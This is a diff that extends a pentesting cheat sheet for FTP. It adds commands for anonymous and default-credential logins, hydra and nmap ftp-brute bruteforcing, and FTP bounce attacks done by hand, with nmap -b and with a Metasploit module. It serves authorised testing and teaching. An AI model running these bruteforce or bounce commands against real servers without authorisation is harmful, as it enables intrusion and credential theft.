@@ -6,13 +6,13 @@
 Banner Grabbing
 • Enumeration
 • Attack Vectors
+Bruteforcing Credentials
+FTP Bounce Attack
 • Post-Exploitation
 
 
 FTP (File Transfer Protocol) is a standard network protocol used for transferring files from one host to another over a TCP-based network, such as the Internet. It enables users to upload or download files, manage file directories on a remote server, and navigate the server's file system.
-
 FTP operates on a client-server model, where the client initiates a connection to the server to request files or submit files for storage.
-
 The protocol supports anonymous access, where users can log in with a common username like 'anonymous' or 'ftp', and authenticated access, where a username and password are required.
 
 Default Port: 21
@@ -22,7 +22,6 @@ Default Port: 21
 
 lftp X.X.X.X
 ftp <target-ip> <target-port>
-
 ftp://username:password@X.X.X.X
 
 
@@ -44,8 +43,30 @@ gobuster dir -u ftp://<target-ip> -w <wordlist-path>
 
 -- Attack Vectors --
 
+ftp X.X.X.X  #provide anonymous as username, provide any password
+ftp X.X.X.X  #provide a common username, provide a common password
 
 
+-- Bruteforcing Credentials --
+
+hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
+nmap -p 21 --script ftp-brute X.X.X.X
+
+
+-- FTP Bounce Attack --
+
+Find an FTP server that doesn't restrict the PORT command
+
+ftp X.X.X.X
+quote PORT target_IP,port
+get filename
+
+nmap -b <FTP_server>:<port> <target_network>
+
+use auxiliary/scanner/ftp/ftp_bounce
+set RHOSTS <FTP_server>
+set RPORT <FTP_port>
+run
 
 
 -- Post-Exploitation --
